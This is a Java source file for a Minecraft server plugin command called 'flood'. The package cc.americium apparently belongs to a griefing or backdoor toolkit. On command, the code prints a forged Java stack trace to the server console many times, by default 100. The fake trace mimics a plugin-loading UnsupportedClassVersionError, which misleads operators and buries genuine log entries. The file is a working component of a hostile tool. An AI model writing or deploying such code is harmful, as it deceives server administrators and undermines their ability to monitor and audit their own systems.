package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Flood implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"flood"};
    }

    @Override
    public String getDescription() {
        return "Floods console with fake errors.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        int messages = 100;
        if (args.length != 0) {
            try {
                messages = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                return;
            }
        }

        sender.sendMessage(Colors.Prefix + Colors.Success + "Attempting to flood console " + messages + " times!");
        int finalMessages = messages;
        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            for (int i = 0; i < finalMessages; i++) {
                System.out.println("[" + i + " [Server thread/ERROR]: Could not load 'net/minecraft/org'\n" +
                        "org.bukkit.plugin.InvalidPluginException: java.lang.UnsupportedClassVersionError: net/minecraft/org has been compiled by a more recent version of the Java Runtime (class file version 56.0), this version of the Java Runtime only recognizes class file versions up to 52.0\n" +
                        "        at org.bukkit.plugin.java.JavaPluginLoader.loadPlugin(JavaPluginLoader.java:139) ~[server.jar:git-Spigot-9de398a-9c887d4]\n" +
                        "        at org.bukkit.plugin.SimplePluginManager.loadPlugin(SimplePluginManager.java:334) ~[server.jar:git-Spigot-9de398a-9c887d4]\n" +
                        "        at org.bukkit.plugin.SimplePluginManager.loadPlugins(SimplePluginManager.java:253) [server.jar:git-Spigot-9de398a-9c887d4]\n" +
                        "        at org.bukkit.craftbukkit.CraftServer.loadPlugins(CraftServer.java:350) [server.jar:git-Spigot-9de398a-9c887d4]\n" +
                        "        at net.minecraft.server.DedicatedServer.init(DedicatedServer.java:194) [server.jar:git-Spigot-9de398a-9c887d4]\n" +
                        "        at net.minecraft.server.MinecraftServer.run(MinecraftServer.java:776) [server.jar:git-Spigot-9de398a-9c887d4]\n" +
                        "        at java.lang.Thread.run(Unknown Source) [?:1.8.0_221]\n" +
                        "Caused by: java.lang.UnsupportedClassVersionError: net/minecraft/org has been compiled by a more recent version of the Java Runtime (class file version 56.0), this version of the Java Runtime only recognizes class file versions up to 52.0\n" +
                        "        at java.lang.ClassLoader.defineClass1(Native Method) ~[?:1.8.0_221]\n" +
                        "        at java.lang.ClassLoader.defineClass(Unknown Source) ~[?:1.8.0_221]\n" +
                        "        at java.security.SecureClassLoader.defineClass(Unknown Source) ~[?:1.8.0_221]\n" +
                        "        at org.bukkit.plugin.java.PluginClassLoader.findClass(PluginClassLoader.java:131) ~[server.jar:git-Spigot-9de398a-9c887d4]\n" +
                        "        at org.bukkit.plugin.java.PluginClassLoader.findClass(PluginClassLoader.java:81) ~[server-1.14.4.jar:git-Spigot-9de398a-9c887d4]\n" +
                        "        at java.lang.ClassLoader.loadClass(Unknown Source) ~[?:1.8.0_221]\n" +
                        "        at java.lang.ClassLoader.loadClass(Unknown Source) ~[?:1.8.0_221]\n" +
                        "        at java.lang.Class.forName0(Native Method) ~[?:1.8.0_221]\n" +
                        "        at java.lang.Class.forName(Unknown Source) ~[?:1.8.0_221]\n" +
                        "        at org.bukkit.plugin.java.PluginClassLoader.<init>(PluginClassLoader.java:59) ~[server.jar:git-Spigot-9de398a-9c887d4]\n" +
                        "        at org.bukkit.plugin.java.JavaPluginLoader.loadPlugin(JavaPluginLoader.java:135) ~[server.jar:git-Spigot-9de398a-9c887d4]\n" +
                        "        ... 6 more");
            }
        });
    }
}
